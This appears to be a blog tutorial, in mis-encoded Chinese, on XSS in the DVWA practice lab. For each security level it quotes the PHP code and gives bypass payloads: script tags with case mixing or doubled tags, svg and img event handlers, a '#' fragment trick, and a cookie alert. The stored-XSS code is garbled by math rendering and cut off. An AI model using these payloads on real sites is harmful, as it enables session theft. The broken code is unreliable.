<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" >

<title>DVWAä¹‹XSS | Gridea</title>
<meta name="description" content="æ¸©æ•…è€ŒçŸ¥æ–°">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<link rel="shortcut icon" href="https://jinqipiaopiao.github.io//favicon.ico?v=1627392112619">

<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
<link rel="stylesheet" href="https://unpkg.com/papercss@1.6.1/dist/paper.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
<link rel="stylesheet" href="https://jinqipiaopiao.github.io//styles/main.css">


<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>


<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />


  </head>
  <body>
  
    <nav class="navbar border fixed split-nav">
  <div class="nav-brand">
    <h3><a href="https://jinqipiaopiao.github.io/">Gridea</a></h3>
  </div>
  <div class="collapsible">
    <input id="collapsible1" type="checkbox" name="collapsible1">
    <button>
      <label for="collapsible1">
        <div class="bar1"></div>
        <div class="bar2"></div>
        <div class="bar3"></div>
      </label>
    </button>
    <div class="collapsible-body">
      <ul class="inline">
        
          <li>
            
              <a href="/" class="menu">
                é¦–é¡µ
              </a>
            
          </li>
        
          <li>
            
              <a href="/archives" class="menu">
                å½’æ¡£
              </a>
            
          </li>
        
          <li>
            
              <a href="/tags" class="menu">
                æ ‡ç­¾
              </a>
            
          </li>
        
          <li>
            
              <a href="/post/about" class="menu">
                å…³äº
              </a>
            
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div id="top" class="row site">
      <div class="sm-12 md-8 col">
        <div class="paper">
          <article class="article">
            <h1>DVWAä¹‹XSS</h1>
            <p class="article-meta">
              2021-03-30
              
            </p>
            
            <div class="post-content">
              <p>XSSæ¦‚å¿µï¼šé€šå¸¸æŒ‡é»‘å®¢é€šè¿‡HTMLæ³¨å…¥çº‚æ”¹äº†ç½‘é¡µï¼Œæ’å…¥æ¶æ„è„šæœ¬ï¼Œä»è€Œåœ¨ç”¨æˆ·æµè§ˆç½‘é¡µæ—¶ï¼Œæ§åˆ¶ç”¨æˆ·æµè§ˆå™¨çš„ä¸€ç§æ”»å‡»ã€‚</p>
<p>XSSä¸‰ç§ï¼š</p>
<p>åå°„å‹xssï¼šåªæ˜¯ç®€å•åœ°æŠŠç”¨æˆ·è¾“å…¥çš„æ•°æ®åå°„ç»™æµè§ˆå™¨ï¼Œç®€å•æ¥è¯´ï¼Œé»‘å®¢å¾€å¾€éœ€è¦ç”¨æˆ·è¯±ä½¿ç”¨æˆ·ç‚¹å‡»ä¸€ä¸ªæ¶æ„é“¾æ¥ï¼Œæ‰èƒ½æ”»å‡»æˆåŠŸã€‚</p>
<p>å­˜å‚¨å‹XSSï¼šå°†ç”¨æˆ·è¾“å…¥çš„æ•°æ®å­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯ã€‚ç”¨æˆ·è®¿é—®äº†å¸¦æœ‰xsså¾—é¡µé¢ä»£ç åï¼Œäº§ç”Ÿå®‰å…¨é—®é¢˜ã€‚</p>
<p>DOMã€€XSSï¼šé€šè¿‡ä¿®æ”¹é¡µé¢çš„DOMèŠ‚ç‚¹å½¢æˆçš„XSSã€‚</p>
<p>XSS(DOM)<br>
DOMå‹xssä¸ä¼šå’Œåå°æœåŠ¡å™¨äº§ç”Ÿäº¤äº’ï¼Œè€Œæ˜¯é€šè¿‡æµè§ˆå™¨çš„domæ ‘è§£æã€‚ä»£ç æµå‘ï¼šå‰ç«¯â€“&gt;æµè§ˆå™¨<br>
1.low</p>
<?php

# No protections, anything goes

?> 
<p>æ²¡æœ‰ä»»ä½•ä»£ç è¿‡æ»¤ã€‚</p>
<p>payloadï¼š</p>
<pre><code>?default=&lt;script&gt;alert('oh')&lt;/script&gt;
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1617074204093.png" alt="" loading="lazy"><br>
2.Medium<br>
æœåŠ¡å™¨æ ¸å¿ƒä»£ç <br>
&lt;?php</p>
<pre><code>// Is there any input?
if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ 'default' ]) ) {
$default = $_GET['default'];

# Do not allow script tags
if (stripos ($default, &quot;&lt;script&quot;) !== false){
header (&quot;location: ?default=English&quot;);
exit;}}?&gt;
</code></pre>
<p>è¿™æ¬¡åç«¯åšäº†é™åˆ¶ï¼Œå‰ç«¯æ— å˜åŒ–ã€‚<br>
ä¸å…è®¸å‡ºç°scriptæ ‡ç­¾ï¼Œå¦åˆ™å°±å°†defaultçš„å€¼è®¾ä¸ºé»˜è®¤çš„Englishï¼Œstriposè¿˜é˜²æ­¢äº†å¤§å°å†™ç»•è¿‡<br>
æ¼æ´åˆ©ç”¨</p>
<p>1.åˆ©ç”¨Urlæˆªæ–­æœºåˆ¶åŠ #å·<br>
urlä¸­æœ‰ä¸€ä¸ªå­—ç¬¦ä¸º#ï¼Œè¯¥å­—ç¬¦åçš„æ•°æ®ä¸ä¼šå‘é€åˆ°æœåŠ¡å™¨ç«¯ï¼Œä»è€Œç»•è¿‡æœåŠ¡ç«¯è¿‡æ»¤ï¼Œæ„é€ è¿æ¥<br>
payloadï¼š<br>
<img src="https://jinqipiaopiao.github.io//post-images/1617090131311.png" alt="" loading="lazy"></p>
<figure data-type="image" tabindex="1"><img src="https://jinqipiaopiao.github.io//post-images/1617075611565.png" alt="" loading="lazy"></figure>
<p>2.ç”¨imgæ ‡ç­¾æˆ–å…¶ä»–æ ‡ç­¾çš„ç‰¹æ€§å»æ‰§è¡Œjsä»£ç ï¼Œæ¯”å¦‚imgæ ‡ç­¾çš„onerroräº‹ä»¶ï¼Œæ„é€ è¿æ¥<br>
ä¹‹å‰ç”¨è¿‡imgçš„æ–¹æ³•ï¼Œè¿™æ¬¡ä½¿ç”¨svgçš„æ–¹æ³•æ¥å®Œæˆã€‚<br>
/dvwa/vulnerabilities/xss_d/?default=<em></option></select>&lt;svg onload=alert(&quot;xss&quot;)&gt;</em><br>
<img src="https://jinqipiaopiao.github.io//post-images/1617075713992.png" alt="" loading="lazy"></p>
<pre><code>        3.High
</code></pre>
<p>æœåŠ¡å™¨æ ¸å¿ƒä»£ç <br>
&lt;?php</p>
<pre><code>// Is there any input?
if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ 'default' ]) ) {

# White list the allowable languages
switch ($_GET['default']) {
case &quot;French&quot;:
case &quot;English&quot;:
case &quot;German&quot;:
case &quot;Spanish&quot;:
# ok
break;
default:
header (&quot;location: ?default=English&quot;);
exit;
}
}

?&gt; 
</code></pre>
<p>è¿™æ¬¡åç«¯åšäº†é™åˆ¶ï¼Œå‰ç«¯æ— å˜åŒ–ã€‚<br>
åœ¨æœåŠ¡å™¨åç«¯åˆ¤æ–­ï¼Œè¦æ±‚defaultçš„å€¼å¿…é¡»ä¸ºselecté€‰æ‹©èœå•ä¸­çš„å€¼default=åªå…è®¸Frenchï¼ŒEnglishï¼ŒGermanï¼ŒSpanishè¿™å‡ ä¸ªå­—ç¬¦ä¸²ï¼Œå¦åˆ™ä¼šç›´æ¥è·³è½¬åˆ°?default=Englishï¼Œè¿™é‡Œç»§ç»­ç”¨ä¸Šé¢çš„#ç¬¦å·ç»•è¿‡å³å¯ï¼Œæ„é€ payload</p>
<p>æ¼æ´åˆ©ç”¨</p>
<p>åŸç†ï¼šç”±äºformè¡¨å•æäº¤çš„æ•°æ®éœ€è¦ç»è¿‡jsè¿‡æ»¤ï¼Œæ‰€ä»¥æ³¨é‡Šéƒ¨åˆ†çš„JavaScriptä»£ç ä¸ä¼šè¢«ä¼ åˆ°æœåŠ¡å™¨ç«¯ï¼ˆä¹Ÿå°±ç¬¦åˆäº†ç™½åå•çš„è¦æ±‚ï¼‰ä»è€Œåªåœ¨å®¢æˆ·ç«¯æ˜¾ç¤ºã€‚</p>
<pre><code>/dvwa/vulnerabilities/xss_d/?default=English#&lt;/option&gt;&lt;/select&gt;&lt;img src=xss onerror=alert(/xss/)&gt;
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://jinqipiaopiao.github.io//post-images/1617075777342.png" alt="" loading="lazy"></figure>
<pre><code>    4.Impossible
</code></pre>
<p>æœåŠ¡å™¨æ ¸å¿ƒä»£ç </p>
<?php

# Don't need to do anything, protction handled on the client side
        æ²¡æœ‰ä»»ä½•ä¸œè¥¿ï¼Œä¿æŠ¤çš„ä»£ç åœ¨å®¢æˆ·ç«¯é‡Œã€‚

?> 
<p>åç«¯æ— ä»»ä½•é™åˆ¶ï¼Œå°è¯•åå±…ç„¶æˆäº†å¦‚ä¸‹å›¾æƒ…å†µã€‚<br>
<img src="https://jinqipiaopiao.github.io//post-images/1617075834074.png" alt="" loading="lazy"></p>
<figure data-type="image" tabindex="3"><a href="https://imgchr.com/i/rpeGlQ"><img src="https://s3.ax1x.com/2020/12/08/rpeGlQ.png" alt="rpeGlQ.png" loading="lazy"></a></figure>
<p>æ²¡æœ‰ä»»ä½•ä¸œè¥¿ï¼Œä¿æŠ¤çš„ä»£ç åœ¨å®¢æˆ·ç«¯é‡Œã€‚</p>
<figure data-type="image" tabindex="4"><a href="https://imgchr.com/i/rpeL7t"><img src="https://s3.ax1x.com/2020/12/08/rpeL7t.md.png" alt="rpeL7t.md.png" loading="lazy"></a></figure>
<p>æŸ¥çœ‹æºä»£ç ï¼š</p>
<p>English French Spanish German</p>
<p>decodeURL(lang)ï¼Œå¯¹langè¿›è¡ŒURLè§£ç ã€‚è€ŒdecodeURL(lang)è¢«(lang)æ›¿ä»£äº†ã€‚å‘ç°æˆ‘ä»¬è¾“å…¥çš„å‚æ•°å¹¶æ²¡æœ‰è¿›è¡ŒURLè§£ç ï¼Œè€Œæˆ‘ä»¬è¾“å…¥çš„å‚æ•°éƒ½æ˜¯ç»è¿‡URLç¼–ç çš„ï¼Œè¢«ç›´æ¥èµ‹äºˆäº†optionæ ‡ç­¾ï¼Œæ‰€ä»¥ä¸å­˜åœ¨XSSæ¼æ´ã€‚</p>
<h4 id="xssreflected">XSS(Reflected)</h4>
<p>åå°„å‹XSSæ”»å‡»<br>
åˆç§°ä¸ºéæŒä¹…æ€§è·¨ç«™ç‚¹è„šæœ¬æ”»å‡»ï¼Œå®ƒæ˜¯æœ€å¸¸è§çš„ç±»å‹çš„XSSã€‚æ¼æ´äº§ç”Ÿçš„åŸå› æ˜¯æ”»å‡»è€…æ³¨å…¥çš„æ•°æ®åæ˜ åœ¨å“åº”ä¸­ã€‚ä¸€ä¸ªå…¸å‹çš„éæŒä¹…æ€§XSSåŒ…å«ä¸€ä¸ªå¸¦XSSæ”»å‡»å‘é‡çš„é“¾æ¥(å³æ¯æ¬¡æ”»å‡»éœ€è¦ç”¨æˆ·çš„ç‚¹å‡») æ¶æ„ä»£ç å¹¶æ²¡æœ‰ä¿å­˜åœ¨ç›®æ ‡ç½‘ç«™ï¼Œç”±æµè§ˆå™¨è§£æè„šæœ¬ã€‚</p>
<h5 id="low">low</h5>
<pre><code>&lt;?php

header (â€œX-XSS-Protection: 0â€);

// Is there any input? if( array_key_exists( â€œnameâ€, $_GET ) &amp;&amp; $_GET[ â€˜nameâ€™ ] != NULL ) { // Feedback for end user echo â€˜&lt;pre&gt;Hello â€˜ . $_GET[ â€˜nameâ€™ ] . â€˜&lt;/pre&gt;â€™; }

?&gt;
</code></pre>
<p>åªå¯¹nameå‚æ•°åˆ¤æ–­äº†ä¸€ä¸‹æ˜¯å¦ä¸ºç©ºï¼Œæ²¡æœ‰è¿›è¡Œä»»ä½•è¿‡æ»¤å’Œæ£€æµ‹ï¼Œå¯ç›´æ¥è¿›è¡Œè¾“å…¥ã€‚</p>
<pre><code>&lt;script&gt;alert('hhh')&lt;/script&gt;
</code></pre>
<figure data-type="image" tabindex="5"><a href="https://imgchr.com/i/rpnxyQ"><img src="https://s3.ax1x.com/2020/12/08/rpnxyQ.png" alt="rpnxyQ.png" loading="lazy"></a></figure>
<p>ä¸€æ­¥åˆ°ä½ã€‚</p>
<h5 id="medium">medium</h5>
<pre><code>&lt;?php

header (â€œX-XSS-Protection: 0â€);

// Is there any input? if( array_key_exists( â€œnameâ€, $_GET ) &amp;&amp; $_GET[ â€˜nameâ€™ ] != NULL ) { // Get input $name = str_replace( â€˜
// Feedback for end user
echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; }
?&gt;
</code></pre>
<p><strong>str_replace():</strong> ç”¨å…¶ä»–å­—ç¬¦ä»£æ›¿å­—ç¬¦ä¸²ä¸­çš„ä¸€äº›å­—ç¬¦ã€‚</p>
<p>mediumçº§åˆ«çš„ä»£ç åªæ˜¯åœ¨lowä¸Šå¢åŠ äº†å¯¹<code>&lt;script&gt;</code>çš„è¿‡æ»¤ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å¤§å°å†™ç»•è¿‡ï¼ˆåŒå†™ç»•è¿‡ï¼‰ã€‚</p>
<pre><code>å¤§å°å†™æ··æ·†ï¼š

è¾“å…¥&lt;ScRipt&gt;alert(/xss/)&lt;/script&gt;ï¼ŒæˆåŠŸå¼¹æ¡†

åŒå†™ç»•è¿‡ï¼š
è¾“å…¥&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt;ï¼ŒæˆåŠŸå¼¹æ¡†

è¾“å…¥å…¶ä»–æ ‡ç­¾ï¼š

è¾“å…¥&lt;img src=1 Î¿nerrÎ¿r=alert('xss')&gt;ï¼ŒæˆåŠŸå¼¹çª—
</code></pre>
<h5 id="high">high</h5>
<pre><code>&lt;?php

header (â€œX-XSS-Protection: 0â€);

// Is there any input? if( array_key_exists( â€œnameâ€, $_GET ) &amp;&amp; $_GET[ â€˜nameâ€™ ] != NULL ) { // Get input $name = preg_replace( â€˜/&lt;(.)s(.)c(.)r(.)i(.)p(.)t/iâ€™, â€˜â€™, $_GET[ â€˜nameâ€™ ] );

// Feedback for end user
echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; }
?&gt;
</code></pre>
<p>**preg_replace()ğŸ˜—*æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢ã€‚</p>
<p>highçº§åˆ«ä»£ç ä½¿ç”¨äº†æ­£åˆ™è¡¨è¾¾å¼ç›´æ¥æŠŠ&lt;scriptè¿‡æ»¤äº†ï¼Œ*è¡¨ç¤ºä¸€ä¸ªæˆ–å¤šä¸ªä»»æ„å­—ç¬¦ï¼Œiä»£è¡¨ä¸åŒºåˆ†å¤§å°å†™ã€‚æ‰€ä»¥å¤§å°å†™ç»•è¿‡å’ŒåŒå†™ç»•è¿‡ä¸èƒ½ç”¨äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é‡‡ç”¨å…¶ä»–æ ‡ç­¾è¿›è¡Œæ³¨å…¥ã€‚<br>
è¿™ä½¿å¾—åŒå†™ç»•è¿‡ã€å¤§å°å†™æ··æ·†ç»•è¿‡ï¼ˆæ­£åˆ™è¡¨è¾¾å¼ä¸­ï¼Œ.*è¡¨ç¤ºè´ªå©ªåŒ¹é…ï¼Œ/iè¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™ï¼‰ä¸å†æœ‰æ•ˆï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨çš„æ˜¯imgæ ‡ç­¾</p>
<p>è¿™é‡Œè®©å¼¹ä¸ªcookieå§ï¼š</p>
<pre><code>        &lt;img src=1 onerror=alert('document.cookie')&gt;
</code></pre>
<p>å½“å›¾ç‰‡æ˜¾ç¤ºé”™è¯¯æ—¶ï¼Œæ‰§è¡Œalert()ï¼Œå°±å°†æˆ‘ä»¬è¦çš„cookieå¼¹å‡ºæ¥äº†ã€‚</p>
<figure data-type="image" tabindex="6"><a href="https://imgchr.com/i/rplpcT"><img src="https://s3.ax1x.com/2020/12/08/rplpcT.png" alt="rplpcT.png" loading="lazy"></a></figure>
<p>impossible</p>
<p>`&lt;?php</p>
<p>// Is there any input? if( array_key_exists( â€œnameâ€, $_GET ) &amp;&amp; $_GET[ â€˜nameâ€™ ] != NULL ) { // Check Anti-CSRF token checkToken( $_REQUEST[ â€˜user_tokenâ€™ ], $_SESSION[ â€˜session_tokenâ€™ ], â€˜index.phpâ€™ );</p>
<p>// Get input<br>
$name = htmlspecialchars( $_GET[ 'name' ] );</p>
<p>// Feedback for end user<br>
echo &quot;<pre>Hello${name}</pre>&quot;; }<br>
// Generate Anti-CSRF token generateSessionToken();</p>
<p>?&gt;`</p>
<p>htmlspecialchars(string)ğŸ˜—* æŠŠé¢„å®šä¹‰çš„å­—ç¬¦ &quot;&lt;&quot;, &quot;&gt;&quot;, &quot;&amp;&quot;, &quot;&quot;(åŒå¼•å·)&quot;, &quot;'(å•å¼•å·)&quot; è½¬æ¢ä¸ºHTMLå®ä½“ï¼Œé˜²æ­¢æµè§ˆå™¨å°†å…¶ä½œä¸ºHTMLå…ƒç´ ã€‚</p>
<p>impossibleçº§åˆ«çš„ä»£ç å…ˆåˆ¤æ–­nameæ˜¯å¦ä¸ºç©ºï¼Œä¸ä¸ºç©ºçš„è¯ç„¶åéªŒè¯å…¶tokenï¼Œæ¥é˜²èŒƒCSRFæ”»å‡»ã€‚ç„¶åå†ç”¨htmlspecialcharså‡½æ•°å°†nameä¸­çš„é¢„å®šä¹‰å­—ç¬¦è½¬æ¢æˆhtmlå®ä½“ï¼Œè¿™æ ·å°±é˜²æ­¢äº†æˆ‘ä»¬å¡«å…¥æ ‡ç­¾ã€‚</p>
<p>XSS(Stored)</p>
<p>low<br>
`&lt;?php</p>
<p>if( isset( $_POST[ â€˜btnSignâ€™ ] ) ) { // Get input $message = trim( $_POST[ â€˜mtxMessageâ€™ ] ); $name = trim( $_POST[ â€˜txtNameâ€™ ] );</p>
<p>// Sanitize message input</p>
<p>$message =<br>
stripslashes( $message );</p>
<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mi>e</mi><mi>s</mi><mi>s</mi><mi>a</mi><mi>g</mi><mi>e</mi><mo>=</mo><mo>(</mo><mo>(</mo><mi>i</mi><mi>s</mi><mi>s</mi><mi>e</mi><mi>t</mi><mo>(</mo></mrow><annotation encoding="application/x-tex">message = 
((isset(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mopen">(</span></span></span></span>GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object(<span class='katex-error' title='ParseError: KaTeX parse error: Expected group after &#039;_&#039; at position 10: GLOBALS[&quot;_Ì²__mysqli_ston&quot;]â€¦'>GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string(</span>GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</p>
<p>// Sanitize name input<br>
<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo>=</mo><mo>(</mo><mo>(</mo><mi>i</mi><mi>s</mi><mi>s</mi><mi>e</mi><mi>t</mi><mo>(</mo></mrow><annotation encoding="application/x-tex">name = 
((isset(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mopen">(</span></span></span></span>GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object(<span class='katex-error' title='ParseError: KaTeX parse error: Expected group after &#039;_&#039; at position 10: GLOBALS[&quot;_Ì²__mysqli_ston&quot;]â€¦'>GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string(</span>GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</p>
<p>// Update database<br>
<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>q</mi><mi>u</mi><mi>e</mi><mi>r</mi><mi>y</mi><mo>=</mo><mi mathvariant="normal">&quot;</mi><mi>I</mi><mi>N</mi><mi>S</mi><mi>E</mi><mi>R</mi><mi>T</mi><mi>I</mi><mi>N</mi><mi>T</mi><mi>O</mi><mi>g</mi><mi>u</mi><mi>e</mi><mi>s</mi><mi>t</mi><mi>b</mi><mi>o</mi><mi>o</mi><mi>k</mi><mo>(</mo><mi>c</mi><mi>o</mi><mi>m</mi><mi>m</mi><mi>e</mi><mi>n</mi><mi>t</mi><mo separator="true">,</mo><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo>)</mo><mi>V</mi><mi>A</mi><mi>L</mi><mi>U</mi><mi>E</mi><mi>S</mi><msup><mo>(</mo><mo mathvariant="normal">â€²</mo></msup></mrow><annotation encoding="application/x-tex">query  = 
&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mord mathdefault">u</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord">&quot;</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">u</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">b</span><span class="mord mathdefault">o</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mopen">(</span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">m</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mclose">)</span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mord mathdefault">A</span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.10903em;">U</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mopen"><span class="mopen">(</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span></span></span></span>message', '$name' );&quot;;</p>
<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>e</mi><mi>s</mi><mi>u</mi><mi>l</mi><mi>t</mi><mo>=</mo><mi>m</mi><mi>y</mi><mi>s</mi><mi>q</mi><mi>l</mi><msub><mi>i</mi><mi>q</mi></msub><mi>u</mi><mi>e</mi><mi>r</mi><mi>y</mi><mo>(</mo></mrow><annotation encoding="application/x-tex">result = 
mysqli_query(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">s</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord"><span class="mord mathdefault">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord mathdefault">u</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mopen">(</span></span></span></span>GLOBALS[&quot;___mysqli_ston&quot;],  <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>q</mi><mi>u</mi><mi>e</mi><mi>r</mi><mi>y</mi><mo>)</mo><mi>o</mi><mi>r</mi><mi>d</mi><mi>i</mi><mi>e</mi><msup><mo>(</mo><mo mathvariant="normal">â€²</mo></msup><mo>&lt;</mo><mi>p</mi><mi>r</mi><mi>e</mi><msup><mo>&gt;</mo><mo mathvariant="normal">â€²</mo></msup><mi mathvariant="normal">.</mi><mo>(</mo><mo>(</mo><mi>i</mi><msub><mi>s</mi><mi>o</mi></msub><mi>b</mi><mi>j</mi><mi>e</mi><mi>c</mi><mi>t</mi><mo>(</mo></mrow><annotation encoding="application/x-tex">query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mord mathdefault">u</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">d</span><span class="mord mathdefault">i</span><span class="mord mathdefault">e</span><span class="mopen"><span class="mopen">(</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel">&gt;</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">.</span><span class="mopen">(</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span 